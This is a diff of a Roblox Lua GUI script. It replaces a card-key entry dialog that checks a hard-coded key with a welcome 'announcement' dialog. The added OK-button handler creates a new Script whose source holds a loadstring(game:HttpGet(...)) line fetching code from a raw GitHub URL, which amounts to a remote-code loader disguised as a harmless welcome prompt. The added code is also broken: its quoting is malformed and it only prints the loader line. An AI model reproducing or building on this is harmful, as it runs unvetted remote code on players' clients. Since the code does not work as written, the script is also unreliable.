@@ -1,51 +1,47 @@
 local player = game.Players.LocalPlayer
 local screenGui = Instance.new("ScreenGui", player.PlayerGui)
-screenGui.Name = "CardSystemGUI"
+screenGui.Name = "AnnouncementSystemGUI"
 
 local frame = Instance.new("Frame", screenGui)
-frame.Size = UDim2.new(0, 300, 0, 200)
-frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+frame.Size = UDim2.new(0, 400, 0, 200)
+frame.Position = UDim2.new(0.5, -200, 0.5, -100)
 frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
 
 local titleLabel = Instance.new("TextLabel", frame)
 titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
 titleLabel.Position = UDim2.new(0, 0, 0, 0)
-titleLabel.Text = "请输入卡密"
+titleLabel.Text = "公告"
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 titleLabel.BackgroundTransparency = 1
 titleLabel.Font = Enum.Font.SourceSansBold
 titleLabel.TextSize = 24
 
-local inputBox = Instance.new("TextBox", frame)
-inputBox.Size = UDim2.new(0.8, 0, 0.3, 0)
-inputBox.Position = UDim2.new(0.1, 0, 0.4, 0)
-inputBox.PlaceholderText = "在此输入卡密"
-inputBox.Text = ""
-inputBox.TextColor3 = Color3.fromRGB(0, 0, 0)
-inputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-inputBox.Font = Enum.Font.SourceSans
-inputBox.TextSize = 18
+local messageLabel = Instance.new("TextLabel", frame)
+messageLabel.Size = UDim2.new(0.9, 0, 0.4, 0)
+messageLabel.Position = UDim2.new(0.05, 0, 0.3, 0)
+messageLabel.Text = "欢迎来到游戏！点击确定以继续。"
+messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+messageLabel.BackgroundTransparency = 1
+messageLabel.Font = Enum.Font.SourceSans
+messageLabel.TextSize = 18
+messageLabel.TextWrapped = true
 
-local submitButton = Instance.new("TextButton", frame)
-submitButton.Size = UDim2.new(0.8, 0, 0.3, 0)
-submitButton.Position = UDim2.new(0.1, 0, 0.75, 0)
-submitButton.Text = "提交"
-submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-submitButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-submitButton.Font = Enum.Font.SourceSansBold
-submitButton.TextSize = 18
+local confirmButton = Instance.new("TextButton", frame)
+confirmButton.Size = UDim2.new(0.5, 0, 0.2, 0)
+confirmButton.Position = UDim2.new(0.25, 0, 0.75, 0)
+confirmButton.Text = "确定"
+confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+confirmButton.Font = Enum.Font.SourceSansBold
+confirmButton.TextSize = 18
 
-local correctCard = "123456"
-
-submitButton.MouseButton1Click:Connect(function()
-    local userCard = inputBox.Text
-    if userCard == correctCard then
-        titleLabel.Text = "卡密正确！"
-        titleLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-    else
-        titleLabel.Text = "卡密错误，请重试！"
-        titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-        inputBox.Text = "" -- 清空输入框
-    end
+confirmButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+    
+    local nextScript = Instance.new("Script", workspace)
+    nextScript.Source = [[
+        print("loadstring(game:HttpGet("https://raw.githubusercontent.com/TGNYS/ma/refs/heads/main/917"))()")
+    ]]
+    nextScript.Disabled = false
 end)
